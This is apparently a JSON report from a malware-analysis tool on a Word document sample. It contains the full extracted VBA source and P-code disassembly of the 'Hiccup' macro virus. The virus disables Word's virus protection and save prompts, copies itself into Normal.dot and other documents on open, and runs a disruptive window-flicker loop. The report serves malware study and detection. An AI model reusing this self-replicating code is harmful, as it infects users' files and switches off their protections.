{
    "docinfo": {
        "attributes": [],
        "behavior": {
            "Call": "May call a DLL using Excel 4 Macros",
            "CodeModule": "May attempt to modify the VBA code",
            "Document_Open": "Runs when the Word or Publisher document is opened",
            "Hex Strings": "Hex-encoded str were detected, may be used to obfuscate str",
            "VBA Stomping": "VBA Stomping was detected: the VBA source code and P-code are different, this may have been used to hide malicious code",
            "VBComponents": "May attempt to modify the VBA code",
            "VBProject": "May attempt to modify the VBA code"
        },
        "macro": "\nPrivate Sub Document_Open()\n On Error Resume Next\n Set Code = New DataObject\n Options.ConfirmConversions = 0\n Options.SaveNormalPrompt = 0\n Options.VirusProtection = 0\nCommandBars(\"Tools\").Controls(\"Macro\").Enabled = 0\n  If NormalTemplate.VBProject.VBComponents(1).Name = \"hiccup\" Then\n    callitn = True\n   Else\n    Set A = NormalTemplate.VBProject.VBComponents(1)\n  End If\n  If ActiveDocument.VBProject.VBComponents(1).Name = \"hiccup\" Then\n    callita = True\n   Else\n    Set A = ActiveDocument.VBProject.VBComponents(1)\n    saveit = True\n  End If\n  Set ab = A.CodeModule\n   Code.SetText hiccup.VBProject.VBComponents(1).CodeModule.Lines(1, hiccup.VBProject.VBComponents(1).CodeModule.CountOfLines)\n   ab.DeleteLines 1, ab.CountOfLines\n   ab.InsertLines 1, Code.GetText\n   A.Name = \"hiccup\"\n   If callitn = True And callita = True Then\n    If Int(Rnd * 8) = 2 Then\n      Call hiccup_payload\n    End If\n   \n   End If\n  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument\nEnd Sub\nPrivate Sub hiccup_payload()\nOn Error Resume Next\nActiveWindow.View.Type = wdPageView\nActiveDocument.Background.Fill.BackColor.RGB = RGB(255, 0, 0)\n\nDo\nDoEvents\nRandomize\nIf Int(Rnd * 10000) = 2 Then\n Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMinimize\n Word.ActiveDocument.ActiveWindow.WindowState = wdWindowStateMaximize\nEnd If\nLoop\nEnd Sub\n' Word 97/2k - Hiccup - PHSYCO XXX\n\n' Processing file: VirusShare_3a1c83fcdb1a3ab3d7cba1aecfb10aaa\n' ===============================================================================\n' Module streams:\n' Macros/VBA/hiccup - 7699 bytes\n' Line #0:\n' Line #1:\n' \tFuncDefn (Private Sub Document_Open())\n' Line #2:\n' \tOnError (Resume Next) \n' Line #3:\n' \tSetStmt \n' \tNew id_945B\n' \tSet Code \n' Line #4:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt ConfirmConversions \n' Line #5:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt SaveNormalPrompt \n' Line #6:\n' \tLitDI2 0x0000 \n' \tLd Options \n' \tMemSt VirusProtection \n' Line #7:\n' \tLitDI2 0x0000 \n' \tLitStr 0x0005 \"Macro\"\n' \tLitStr 0x0005 \"Tools\"\n' \tArgsLd CommandBars 0x0001 \n' \tArgsMemLd Controls 0x0001 \n' \tMemSt Enabled \n' Line #8:\n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0006 \"hiccup\"\n' \tEq \n' \tIfBlock \n' Line #9:\n' \tLitVarSpecial (True)\n' \tSt callitn \n' Line #10:\n' \tElseBlock \n' Line #11:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd NormalTemplate \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tSet A \n' Line #12:\n' \tEndIfBlock \n' Line #13:\n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd New \n' \tLitStr 0x0006 \"hiccup\"\n' \tEq \n' \tIfBlock \n' Line #14:\n' \tLitVarSpecial (True)\n' \tSt callita \n' Line #15:\n' \tElseBlock \n' Line #16:\n' \tSetStmt \n' \tLitDI2 0x0001 \n' \tLd ActiveDocument \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tSet A \n' Line #17:\n' \tLitVarSpecial (True)\n' \tSt saveit \n' Line #18:\n' \tEndIfBlock \n' Line #19:\n' \tSetStmt \n' \tLd A \n' \tMemLd CodeModule \n' \tSet ab \n' Line #20:\n' \tLitDI2 0x0001 \n' \tLitDI2 0x0001 \n' \tLd hiccup \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tMemLd CountOfLines \n' \tLitDI2 0x0001 \n' \tLd hiccup \n' \tMemLd VBProject \n' \tArgsMemLd VBComponents 0x0001 \n' \tMemLd CodeModule \n' \tArgsMemLd Lines 0x0002 \n' \tLd Code \n' \tArgsMemCall SetText 0x0001 \n' Line #21:\n' \tLitDI2 0x0001 \n' \tLd ab \n' \tMemLd CountOfLines \n' \tLd ab \n' \tArgsMemCall DeleteLines 0x0002 \n' Line #22:\n' \tLitDI2 0x0001 \n' \tLd Code \n' \tMemLd GetText \n' \tLd ab \n' \tArgsMemCall InsertLines 0x0002 \n' Line #23:\n' \tLitStr 0x0006 \"hiccup\"\n' \tLd A \n' \tMemSt New \n' Line #24:\n' \tLd callitn \n' \tLitVarSpecial (True)\n' \tEq \n' \tLd callita \n' \tLitVarSpecial (True)\n' \tEq \n' \tAnd \n' \tIfBlock \n' Line #25:\n' \tLd Rnd \n' \tLitDI2 0x0008 \n' \tMul \n' \tFnInt \n' \tLitDI2 0x0002 \n' \tEq \n' \tIfBlock \n' Line #26:\n' \tArgsCall (Call) hiccup_payload 0x0000 \n' Line #27:\n' \tEndIfBlock \n' Line #28:\n' Line #29:\n' \tEndIfBlock \n' Line #30:\n' \tLd saveit \n' \tLitVarSpecial (True)\n' \tEq \n' \tIf \n' \tBoSImplicit \n' \tLd ActiveDocument \n' \tMemLd FullName \n' \tParamNamed FileName \n' \tLd wdFormatDocument \n' \tParamNamed FileFormat \n' \tLd ActiveDocument \n' \tArgsMemCall SaveAs 0x0002 \n' \tEndIf \n' Line #31:\n' \tEndSub \n' Line #32:\n' \tFuncDefn (Private Sub hiccup_payload())\n' Line #33:\n' \tOnError (Resume Next) \n' Line #34:\n' \tLd wdPageView \n' \tLd ActiveWindow \n' \tMemLd View \n' \tMemSt TypeOf \n' Line #35:\n' \tLitDI2 0x00FF \n' \tLitDI2 0x0000 \n' \tLitDI2 0x0000 \n' \tArgsLd RSet 0x0003 \n' \tLd ActiveDocument \n' \tMemLd Background \n' \tMemLd Fill \n' \tMemLd BackColor \n' \tMemSt RSet \n' Line #36:\n' Line #37:\n' \tDo \n' Line #38:\n' \tArgsCall DoEvents 0x0000 \n' Line #39:\n' \tArgsCall Read 0x0000 \n' Line #40:\n' \tLd Rnd \n' \tLitDI2 0x2710 \n' \tMul \n' \tFnInt \n' \tLitDI2 0x0002 \n' \tEq \n' \tIfBlock \n' Line #41:\n' \tLd wdWindowStateMinimize \n' \tLd Word \n' \tMemLd ActiveDocument \n' \tMemLd ActiveWindow \n' \tMemSt WindowState \n' Line #42:\n' \tLd wdWindowStateMaximize \n' \tLd Word \n' \tMemLd ActiveDocument \n' \tMemLd ActiveWindow \n' \tMemSt WindowState \n' Line #43:\n' \tEndIfBlock \n' Line #44:\n' \tLoop \n' Line #45:\n' \tEndSub \n' Line #46:\n' \tQuoteRem 0x0000 0x0021 \" Word 97/2k - Hiccup - PHSYCO XXX\"\n"
    },
    "filename": "VirusShare_3a1c83fcdb1a3ab3d7cba1aecfb10aaa",
    "filesize": 46080,
    "filetype": "Composite Document File V2 Document, Little Endian, Os: Windows, Version 4.0, Code page: 1252, Author: Ditry PC, Template: Normal.dot, Last Saved By: Ditry PC, Revision Number: 1, Name of Creating Application: Microsoft Word 8.0, Create Time/Date: Wed Feb 27 11:15:00 2002, Last Saved Time/Date: Wed Feb 27 11:15:00 2002, Number of Pages: 1, Number of Words: 0, Number of Characters: 0, Security: 0",
    "hashes": {
        "md5": "3a1c83fcdb1a3ab3d7cba1aecfb10aaa",
        "sha1": "517b8d78ec4472b9541ab49e26956e24a7f68acb",
        "sha256": "d8d36740569da5881566c6000f74d923185f29467ac22d4cfeeb821ca71e1cd5"
    },
    "peinfo": {},
    "strings": {
        "dump": [
            "bjbj\u064e",
            "/ =!",
            "bjbj\u064e",
            "bfbf",
            "Ditry PC",
            "Normal.dot",
            "Ditry PC",
            "Microsoft Word 8.0",
            "Title",
            "_PID_GUID",
            "Macro",
            "Tools",
            "hiccup",
            "hiccup",
            "hiccup ",
            " Word 97/2k - Hiccup - PHSYCO XXX",
            "Attribut",
            "e VB_Nam",
            "e = \"hic@cup\"",
            "t0{000@20906-",
            "$004",
            "|Creat",
            "Fals",
            "Predec$la",
            "\"Expose",
            "TemplateDeriv",
            "Customizc",
            "Sub Docu",
            "ment_Ope",
            " Error R",
            " Next",
            "Set CodA",
            "hNew D",
            "bjec",
            "ions.Con",
            "firm",
            "ver6s",
            "veNormal@Prompt",
            "Virus",
            "Command",
            "Bars(\"To ols\")4tr",
            "(\"Macro9",
            "8 If ",
            "4.VB,G",
            ",Ps+",
            "+Ps+",
            "+Ps+",
            "1,Ps+",
            "pon=s",
            "(1).L Th",
            "-   callitn",
            " ADA",
            "End&A",
            "(Act",
            "oE`8(a",
            "\u0441%  shiAf<S,A<ab",
            "`deModul",
            " C3A",
            ".Line",
            "CountO",
            "  ab.@Delete",
            " <1,A",
            "\t6@\tIn0sert",
            "5KA| A",
            "nt(R`",
            "* 8)",
            "  CJ",
            "_payload",
            " G- ",
            "3\t ,;kAs FileaZ:=",
            "PFull",
            "qt:=wd#",
            "Window",
            ".View.Ty",
            "pwdPage",
            "K_Backgr:d.",
            "Color.RG",
            "(255,",
            "Evax",
            "Qj/1",
            "/Wo8rd.\"*",
            "= wd",
            "Mi|ni!^",
            ";Loop.",
            " 97/2`k - H",
            "HSYCO XX",
            "hTP<",
            "0/8)",
            "hTP<",
            "\tcX(",
            "0/8)",
            "hTP<",
            ">8F%",
            "hTP<5",
            "(cX]/",
            "c@]/'\\",
            "cX]/\\0",
            "'$'4'D'T'd't'''",
            "tdTD4$",
            "93c7cbfe4",
            "#Ps+",
            "Wordk",
            "Win16~",
            "Win32",
            "Normal",
            "stdole`",
            "MSFormsC",
            "ThisDocument<",
            "_Evaluate",
            "Office",
            "Documentj",
            "Document_Open",
            "hiccup_payloadoT",
            "DataObject",
            "Code",
            "Options",
            "CommandBars",
            "NormalTemplateq",
            "callitn",
            "ActiveDocument\\",
            "callita",
            "saveit<",
            "ab|\\",
            "hiccupy",
            "VBProjectOh",
            "RndR",
            "wdFormatDocument",
            "ConfirmConversions",
            "SaveNormalPrompt\u02bc",
            "VirusProtectionoD",
            "ControlsK",
            "Enabled\u06ea",
            "VBComponents",
            "CodeModule",
            "SetText",
            "Lines",
            "CountOfLines!\\",
            "DeleteLines",
            "InsertLines",
            "GetText",
            "SaveAsf;",
            "FileNamej",
            "FullName\u041e",
            "FileFormat",
            "ActiveWindow+",
            "ViewI",
            "wdPageViewv",
            "Background.",
            "Fill,",
            "BackColor\u0783",
            "WindowState|",
            "wdWindowStateMinimize4a",
            "wdWindowStateMaximizeU",
            "_B_var_Code'#",
            "Itemz",
            "_B_var_callitn",
            "_B_var_A",
            "_B_var_callita",
            "_B_var_saveit8",
            "_B_var_ab$",
            "Normal",
            "stdo",
            "G{00020430-",
            "0046}#2",
            ".0#0#C:\\",
            "WINDOWS\\",
            "SYSTEM\\S",
            "TDOLE2.T",
            " Automation",
            "MSF!ms>",
            "917D1925",
            "-2B6E-11",
            "D6-ACD9-",
            "D4018890031C5",
            "WD#Microsoft ",
            " Object Library",
            "P8,PJP\\VB$E\\(EX(.",
            "ACxOfficDxO@u`f",
            "cBx,",
            ",2DF8D04",
            "C-5BFA-1",
            "01B-BDE5@xAA@w4",
            "PROGRAM ",
            "FILES\\MI",
            "CROSOFT OFFICE\\",
            "MSO97.DLLHZ# 8.0Z\"",
            "Bhiccup*",
            "2Bh2c",
            "(Ps+",
            "Normal",
            "ThisDocument",
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB",
            "Word",
            "C:\\WINDOWS\\SYSTEM\\STDOLE2.TLB",
            "stdole",
            "C:\\WINDOWS\\SYSTEM\\MSForms.TWD",
            "MSForms",
            "C:\\WINDOWS\\TEMP\\VBE\\MSForms.EXD",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL",
            "Office",
            "'Ps+",
            "&Ps+",
            "Document",
            "hiccup",
            ",Ps+",
            "+Ps+",
            "Document_Open",
            "hiccup_payload",
            "Macro",
            "Tools",
            "hiccup",
            "CodeModule",
            "SetText",
            "CountOfLines",
            "DeleteLines",
            "GetText",
            "InsertLines",
            "Name",
            "VBA332.DLL",
            "hiccup",
            "ID=\"{5090AB33-2B73-11D6-ACD9-D401889031C5}\"",
            "Document=hiccup/&H00000000",
            "Name=\"Normal\"",
            "HelpContextID=\"0\"",
            "CMG=\"6567C998DF27E327E327E327E3\"",
            "DPB=\"F0F25C9F5D9F5D9F\"",
            "GC=\"7B79D7AE63AF63AF9C\"",
            "[Host Extender Info]",
            "&H00000001={3832D640-CF90-11CF-8E43-00A0C911005A};VBE;&H00000000",
            "[Workspace]",
            "hiccup=0, 0, 0, 0, C",
            "Microsoft Word Document",
            "MSWordDoc",
            "Word.Document.8",
            " PAGE ",
            "Attention:",
            "ATTN:",
            " AUTHOR ",
            "\tPage ",
            " PAGE ",
            " DATE ",
            "Best regards,",
            "Best wishes,",
            "CERTIFIED MAIL",
            "CONFIDENTIAL",
            "Confidential\tPage ",
            " PAGE ",
            " DATE ",
            "Cordially,",
            "Created by ",
            " AUTHOR ",
            "Created on ",
            " CREATEDATE ",
            "Dear Mom and Dad,",
            "Dear Sir or Madam:",
            " FILENAME ",
            " FILENAME \\p ",
            "In reply to:",
            "Ladies and Gentlemen:",
            "Last printed ",
            " PRINTDATE ",
            "Last saved by ",
            " LASTSAVEDBY ",
            "Love,",
            "Page ",
            " PAGE ",
            " of ",
            " NUMPAGES ",
            "PERSONAL",
            "Reference:",
            "Regards,",
            "REGISTERED MAIL",
            "Respectfully yours,",
            "Respectfully,",
            "Sincerely yours,",
            "Sincerely,",
            "SPECIAL DELIVERY",
            "Subject:",
            "Take care,",
            "Thank you,",
            "Thanks,",
            "To Whom It May Concern:",
            "VIA AIRMAIL",
            "VIA FACSIMILE",
            "VIA OVERNIGHT MAIL",
            "Yours truly,",
            "/ =!"
        ],
        "file": {
            "C:\\PROGRAM FILES\\COMMON FILES\\MICROSOFT SHARED\\VBA\\VBA332.DLL": "Library",
            "C:\\PROGRAM FILES\\MICROSOFT OFFICE\\OFFICE\\MSO97.DLL": "Library",
            "C:\\Program Files\\Microsoft Office\\Office\\MSWORD8.OLB": "Autogen",
            "VBA332.DLL": "Library"
        },
        "fuzzing": {},
        "ip": [],
        "url": []
    },
    "time": "0:00:00.292886",
    "version": "6.0.3",
    "virustotal": {
        "positives": "",
        "total": ""
    },
    "yara_plugins": [
        {
            "maldoc_somerules.yar": "office_document_vba"
        },
        {
            "Maldoc_VBA_macro_code.yar": "Contains_VBA_macro_code"
        }
    ]
}
